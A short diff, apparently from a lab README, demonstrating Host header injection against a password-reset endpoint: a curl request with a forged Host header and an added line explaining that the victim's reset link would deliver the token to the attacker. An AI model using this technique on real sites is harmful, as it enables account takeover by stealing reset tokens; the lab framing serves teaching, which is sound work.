@@ -43,7 +43,7 @@ python attacker.py
 Send the request with modified HOST to the real server
 ```
 curl -i -X POST http://127.0.0.1:5000/forgot-password -H "Host: 127.0.0.1:8000" -d "email=victim@gmail.com"
-HTTP/1.1 200 OK
 ```
 
+Server will send an email to the victim with the modified reset password url, if the victim presses the link attacker will get the token.
 
